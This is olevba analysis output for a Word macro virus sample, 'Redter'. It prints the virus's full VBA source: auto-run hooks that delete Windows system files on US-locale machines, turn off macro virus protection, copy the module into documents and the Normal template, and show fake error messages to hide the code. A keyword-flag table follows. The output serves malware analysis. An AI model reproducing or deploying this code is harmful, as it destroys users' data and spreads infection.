olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Redter
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Redter - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO RedTerrorist.bas 
in file: Virus.MSWord.Redter - OLE stream: 'Macros/VBA/RedTerrorist'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
  Call FuckThemAll
End Sub

Sub AutoClose()
  Call FuckThemAll
End Sub

Sub FuckThemAll()
  Dim flag As Boolean
  On Error Resume Next

  If System.Country = wdUS Then
    Shell "c:\command.com \C echo y | del " + Environ("windir") + "\system\*.* > nul"
  End If

  With Options
      .SaveNormalPrompt = False
      .VirusProtection = False
      .AllowFastSave = True
      .BackgroundSave = True
  End With

  flag = False
  For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents.Item(i).Name _
    = "RedTerrorist" Then flag = True
  Next

  If Not flag Then
    NormalTemplate.VBProject.VBComponents("RedTerrorist").Export (Environ("windir") + "\temp\user.vxd")
    ActiveDocument.VBProject.VBComponents.import (Environ("windir") + "\temp\user.vxd")
    Kill Environ("windir") + "\temp\user.vxd"
    ActiveDocument.SaveAs ActiveDocument.FullName, wdFormatDocument
  End If

  flag = False
  For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(i).Name = "RedTerrorist" Then flag = True
  Next

  If Not flag Then
    ActiveDocument.VBProject.VBComponents("RedTerrorist").Export (Environ("windir") + "\temp\user.vxd")
    NormalTemplate.VBProject.VBComponents.import (Environ("windir") + "\temp\user.vxd")
    Kill Environ("windir") + "\temp\user.vxd"

    NormalTemplate.Save
    NormalTemplate.Saved = True
  End If
End Sub

Sub ToolsMacro()
  Call Delay
  MsgBox "Top level process aborted, cannot continue", vbCritical
End Sub

Sub ToolsCustomize()
  Call Delay
  MsgBox "Configuration too large for memory", vbCritical
End Sub

Sub ViewVBCode()
  Call Delay
  MsgBox "Error in EXE file, program too big to fit in memory", vbCritical
End Sub

Sub Delay()
  Dim i As Double
  For i = 0 To 19170000
  Next
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

